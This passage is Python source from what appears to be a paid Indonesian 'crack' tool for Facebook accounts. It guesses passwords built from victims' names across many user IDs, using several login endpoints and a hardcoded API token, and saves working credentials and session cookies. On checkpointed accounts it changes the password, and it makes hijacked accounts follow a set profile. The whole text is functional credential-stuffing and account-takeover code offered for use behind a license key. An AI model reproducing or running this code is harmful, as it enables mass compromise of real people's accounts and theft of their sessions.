    urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
    response=BeautifulSoup(urlPost.text, "html.parser")
    if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
        sys.stdout.write('\r %s[%s!%s] Hidupkan mode pesawat 2 detik         '%(N,M,N)),
    if "c_user" in session.cookies.get_dict():
        if "Akun Anda Dikunci" in urlPost.text:
            print(f"\r {N}[{M}×{N}] akun sesi new")
        else:
            coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
            open('results/OKE.txt', 'a').write(f" [✓] {user}|{pasw}|{coki}\n")
            print(f"\r  🎉{H} hore akunya tidak checkpoint{N}");jalan(f"\r  {H}*{N}  tunggu sebentar sedang mengecek aplikasi...{N}");time.sleep(0.03)
            cek_apk(session,coki)
    elif "checkpoint" in session.cookies.get_dict():
        title=re.findall("\<title>(.*?)<\/title>",str(response))
        link2=response.find("form",{"method":"post"})
        listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
        for x in response("input"):
            if x.get("name") in listInput:
                data2.update({x.get("name"):x.get("value")})
        an=session.post(url_mb+link2.get("action"),data=data2)
        response2=BeautifulSoup(an.text,"html.parser")
        number=0
        cek=[cek.text for cek in response2.find_all("option")]
        if(len(cek)==0):
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                if "y" in ubahP:
                    mmk = pwBaru
                    print(f"\r  🎉{H} hore akunya tap yes{N}");jalan(f"\r  {O}*{H}  tunggu sebentar sedang mengubah password dan mengecek aplikasi...{N}");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
                else:
                    mmk = "YayanGanteng:v"
                    print(f"\r  🎉{H} hore akunya tap yes{N}");jalan(f"\r  {O}*{H}  tunggu sebentar sedang mengubah password dan mengecek aplikasi...{N}");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
            elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
                print(' [%s!%s] opshh akunya terpasang autentikasi dua faktor :('%(M,N))
            else:
                open('results/ERROR.txt', 'a').write(f" [×] {user}|{pasw}\n")
                print(f" {N}[{M}!{N}] Error")
        else:
            open(f'results/CP-DETEKTOR-{ha}-{op}-{ta}.txt', 'a').write(f" [×] {user}|{pasw}\n")
            print(" %s[%s*%s] Terdapat %s Opsi "%(N,O,N,len(cek)))
        for opt in range(len(cek)):
            print(f" [\x1b[1;92m{str(opt+1)}\x1b[0m] "+cek[opt])
    else:
        print(f"\r {N}[{M}!{N}] Kata sandi salah atau sudah diubah")
        open('results/INVALID-OK.txt', 'a').write(f" [×] {user}|{pasw}\n")

#UBAH PW
def ubah_pw(session,response,link2,user,mmk):
    dat,dat2={},{}
    but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
    for x in response("input"):
        if x.get("name") in but:
            dat.update({x.get("name"):x.get("value")})
    ubahPw=session.post(url_mb+link2.get("action"),data=dat).text
    resUbah=BeautifulSoup(ubahPw,"html.parser")
    link3=resUbah.find("form",{"method":"post"})
    but2=["submit[Next]","nh","fb_dtsg","jazoest"]
    if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
        for b in resUbah("input"):
            if b.get("name") in but2:
                dat2.update({b.get("name"):b.get("value")})
        dat2.update({"password_new":"".join(mmk)})
        an=session.post(url_mb+link3.get("action"),data=dat2)
        coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
        print(f"\r {H}[{N}✓{H}] berhasil mengubah password menjadi:\n {N}[{H}✓{M}]{H} {user}|{''.join(mmk)}|{coki}{N}")
        open('results/TAB-YES.txt', 'a').write(f" [✓] {user}|{''.join(mmk)}|{coki}\n")
        cek_apk(session,coki)
# CEK APLIKASI YANG TERKAIT
def cek_apk(session,cookie):
    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.")
    else:
        for i in range(len(game)):
            print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.")
    else:
        for i in range(len(game)):
            print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

#CEK KEY
def cek_key():
    os.system("clear")
    try:
        open('/data/data/com.termux/.henceut.txt', 'r').read()
        jalan(f"\n[{M}×{N}] opshh askses login di tolak karena anda sebelumnya sudah register");time.sleep(3);register()
    except (KeyError,IOError):
        cok()
#REGISTER
def register():
    os.system("clear")
    jalan(f"\n{N}[{M}×{N}] opshh api key kamu sudah kadaluarsa silahkan upgrade ke premium!")
    upd = input(f"[{B}?{N}] API KEY EXPIRED.PURCHASE NEW ONE [Y/t]: ")
    if upd =="":
        print(f"{N}[{M}×{N}] Y/t memek!");time.sleep(2);register()
    elif upd in["Y","y"]:
        jalan(f"{N}[{O}>{N}]  {H}whatsapp{N}...");time.sleep(0.02)
        os.system('xdg-open https://wa.me/+2348110044418?text=KARMa+David+BELI+LISENSINYA+DOOONG...........???');register()
    elif upd in["T","t"]:
        jalan(f"{B} >> Good byee:)");exit()
    else:
        print(f"{N}[{M}×{N}] Y/t memek!");time.sleep(2);register()

#LOGIN KEY
def cok():
    os.system("clear")
    print("%s[➣] ADMIN IS NOT RESPONSIBLE FOR ABUSE OF THIS TOOLS"%(N))
    print("[➣] MESSAGE ADMIN FOR COOKIE (%sKARMA%s)"%(N,M))
    print("[➣] IF YOU DO NOT UNDERSTAND USING THE TOOLS, PLEASE CONTACT THE ADMIN BY TYping'%sADMIN%s'"%(N,M))
    print("[➣] OWNER KARMA DAVID %sTRIAL%s PLEASE PURCHASE LINCES KEY (%s1 day%s)"%(N,M,N,M))
    print("[➣] (ADMIN IS NOT RESPONSIBLE FOR ABUSE OF THIS TOOL)")
    print("[➣] SCRIPT UPDATED [ 15 Feb 2022]")
    key = input("\n[*] PURCHASE CODE : ")
    if key == '':
        print("\[!] jangan kosong bro");time.sleep(2);cok()
    elif key in['admin','Admin','ADMIN']:
        jalan("\n %s* %sMESSAGE ADMIN..."%(O,H));time.sleep(0.02)
        os.system('xdg-open https://wa.me/+2348110044418?text=KARMA+DAVID+BELI+LISENSINYA+DOOONG...........???');time.sleep(2);cok()
    elif key in['trial','Trial','TRIAL']:
        jalan("\n %s* %sAnda akan di alihkan ke website..."%(O,H));time.sleep(0.02)
        os.system('xdg-open https://wa.me/+2348110044418');cok()
    try:
        req = requests.get(f"https://apikey.yayanxd.my.id/check.php?key={key}", headers={"user-agent":"Mozilla/5.0 (Linux; Android 9; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Mobile Safari/537.36"}, timeout=10).json()
        kadaluarsa = req['expired']
        user = req["nama"]
        open('/data/data/com.termux/.henceut.txt', 'w').write(key)
        jalan(f"\n[{H}•{N}] Hallo {H}{user}{N} your apikey is still valid till date: {M}{kadaluarsa}{N}, .");time.sleep(2)
        exit("[%s!%s] rerun the command by typing python lipid.py"%(M,N))
    except KeyError:
        print("\n%s[%s!%s] api key %s%s%s tidak terdaftar di website"%(N,M,N,M,key,N));time.sleep(2);cok()

# MULAI CRACK
class __crack__:

    def __init__(self):
        self.id = []

    def plerr(self,id):
        self.id = id
        print('\n [%s➣%s] to TOTAL ID ➣ %s%s%s' %(N,M,N,len(self.id),M))
        ___yayanganteng___ = input(' [%s➣%s] CRACK USING DEFAULT PASSWORD [t]? [Y/t]: '%(O,N))
        if ___yayanganteng___ in ('Y', 'y'):
            print('\n %s[%s!%s] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N))
            while True:
                pwek = input('\n [%s?%s] masukan kata sandi : '%(O,N))
                print(' [*] crack dengan sandi -> [ %s%s%s ]' % (M, pwek, N))
                if pwek == '':
                    print('\n %s[%s×%s] jangan kosong bro kata sandi nya'%(N,M,N))
                elif len(pwek)<=5:
                    print('\n %s[%s×%s] kata sandi minimal 6 karakter'%(N,M,N))
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        cin = input('\n [*] method : ')
                        if cin == '':
                            print('\n %s[%s×%s] jangan kosong bro'%(N,M,N));__yan__()
                        elif cin == '1':
                            print('\n [%s+%s] KARMA OK SAVED TO ➣ results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print(' [%s+%s] KARMA CP SAVED TO ➣ results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print('\n [%s!%s] you can turn off cellular data to pause crack\n'%(N,M))
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__api__, kimochi, ysc)
                                    except: pass

                            hasil(ok,cp)
                        elif cin == '2':
                            print('\n [%s+%s] KARMA OK SAVED TO  ➣ results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print(' [%s+%s] KARMA CP SAVED TO  ➣ results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print('\n [%s!%s] you can turn off cellular data to pause the crack process\n'%(N,))
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__metode__, kimochi, ysc, "mbasic.facebook.com")
                                    except: pass

                            hasil(ok,cp)
                        elif cin == '3':
                            print('\n [%s+%s] MKARMA OK SAVED TO  ➣  results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print(' [%s+%s] KARMA CP SAVED TO  ➣   results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta))
                            print('\n [%s!%s] you can turn off cellular data to pause the crack process\n'%(M,N))
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__metode__, kimochi, ysc, "m.facebook.com")
                                    except: pass

                            hasil(ok,cp)
                        else:
                            print('\n %s[%s×%s] input yang bener'%(N,M,H));__yan__()
                    print('\n [ pilih method login - silahkan coba satu² ]\n')
                    print(' [%s1%s]. METHOD MBASIC (SLOW)'%(U,P))
                    print(' [%s2%s]. METHOD MOBILE (FAST)'%(O,N))
                    print(' [%s3%s]. METHOD API (FASTER) [\033[92mRECOMMENDED\033[0m]'%(U,P))
                    __yan__(pwek.split(','))
                    break
        elif ___yayanganteng___ in ('T', 't'):
            print('\n [ SELECT LOGIN METHOD - PLEASE CHOOSE 3² ]\n')
            print(' [%s1%s]. METHOD MBASIC (SLOW)'%(N,M))
            print(' [%s2%s]. METHOD MOBILE (FAST)'%(N,M))
            print(' [%s3%s]. METHOD API (FASTER) [\033[92mKARMA OK ID\033[0m]'%(N,M))
            self.__pler__()
        else:
            print('\n %s[%s➣%s] y/t goblok!'%(N,M,N));self.plerr(id)

    def __api__(self, user, __yan__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write(f'\r [➣] [KARMA] {loop}/{len(self.id)} ➣KARMA-OK-:{len(ok)} - CP-:{len(ok)} '),
            sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            p = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
            if "access_token" in p:
                print('\r  %s➣ [KARMA-CP] %s|%s|%s                 %s' % (O,user,pw,P))
                wrt = ' [✓] %s|%s' % (user,pw)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif "www.facebook.com" in p["error_msg"]:
                try:
                    kontol = open('.token.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print('\r  %s➣[KARMA] %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N))
                    wrt = ' [➣] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print('\r  %s➣ [KARMA-CP] %s|%s                %s' % (K,user,pw,N))
                wrt = ' [➣] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue
        loop += 1

    def __metode__(self, user, __yan__, cebok):
        global ok,cp,loop
        sys.stdout.write(f'\r [➣] [KARMA] {loop}/{len(self.id)} ➣KARMA-OK-:{len(ok)} - CP-:{len(cp)} '),
        sys.stdout.flush()
        try:
            for pw in __yan__:
                pw = pw.lower()
                session=requests.Session()
                header = {
                    "Host":cebok,
                    "upgrade-insecure-requests":"1",
                    "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt":"1",
                    "x-requested-with":"mark.via.gp",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://m.facebook.com/",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {
                    "Host":cebok,
                    "cache-control":"max-age=0",
                    "upgrade-insecure-requests":"1",
                    "origin":"https://"+cebok,
                    "content-type":"application/x-www-form-urlencoded",
                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "x-requested-with":"XMLHttpRequest",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f'\r  {H}*[KARMA-OK] {user}|{pw}|{coki}{N}')
                    wrt = ' [✓] %s|%s|%s' % (user,pw,coki)
                    ok.append(wrt)
                    open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r  %s* [KARMA-CP] %s|%s|%s %s %s     %s' % (O,user,pw,day,month,year,N))
                        wrt = ' [➣] %s|%s|%s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
                        open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:pass
                    print('\r  %s*[KARMA-CP] %s|%s                %s' % (O,user,pw,N))
                    wrt = ' [×] %s|%s' % (user,pw)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                else:
                    continue

            loop+=1
        except:
            self.__metode__(user, pw, cebok)
#    <- Bot followers ->
    def follow(self,session,coki):
        r = BeautifulSoup(session.get("https://mbasic.facebook.com/profile.php?id=553503218",cookies={"cookie":coki}).text,"html.parser")
        get = r.find("a",string="Ikuti").get("href")
        session.get("https://mbasic.facebook.com"+str(get),cookies={"cookie":coki}).text

    def __pler__(self):
        yan = input('\n [➣] method : ')
        if yan == '':
            print('\n %s[%s×%s] jangan kosong bro'%(O,H,O));self.__pler__()
        elif yan in ('1', '01'):
            print('\n [%s➣%s] Karma OK Saved To ➣ results/OK-%s-%s-%s.txt'%(O,H,ha, op, ta))
            print(' [%s➣%s] Karma Cp Saved To ➣ results/CP-%s-%s-%s.txt'%(O,H,ha, op, ta))
            print('\n [%s➣%s] TRY FLIGHT MODE IF NO RESULT\n'%(N,M))
            with YayanGanteng(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        kirim.submit(self.__api__, uid, pwx)
                    except:
                        pass

            hasil(ok,cp)
        elif yan in ('2', '02'):
            print('\n [%s+%s] KARMA OK SAVED TO ➣ results/OK-%s-%s-%s.txt'%(O,H,ha, op, ta))
            print(' [%s+%s] KARMA CP SAVED TO ➣ results/CP-%s-%s-%s.txt'%(O,H,ha, op, ta))
            print('\n [%s➣%s] SWITCH FLIGHT MODE FOR 3 SEC\n'%(N,M))
            with YayanGanteng(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        kirim.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass

            hasil(ok,cp)
        elif yan in ('3', '03'):
            print('\n [%s➣%s] KARMA OK SAVED TO ➣ results/OK-%s-%s-%s.txt'%(O,H,ha, op, ta))
            print(' [%s➣%s] KARMA CP SAVED TO ➣ results/CP-%s-%s-%s.txt'%(O,H,ha, op, ta))
            print('\n [%s➣%s] SWITCH TO FLIGHT MODE FOR 3 SEC\n'%(M,N))
            with YayanGanteng(max_workers=30) as kirim:
                for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        kirim.submit(self.__metode__, uid, pwx, "m.facebook.com")
                    except:
                        pass

            hasil(ok,cp)
        else:
            print('\n %s[%s×%s] input yang bener'%(N,M,N));self.__pler__()


if __name__ == '__main__':
    moch_yayan()
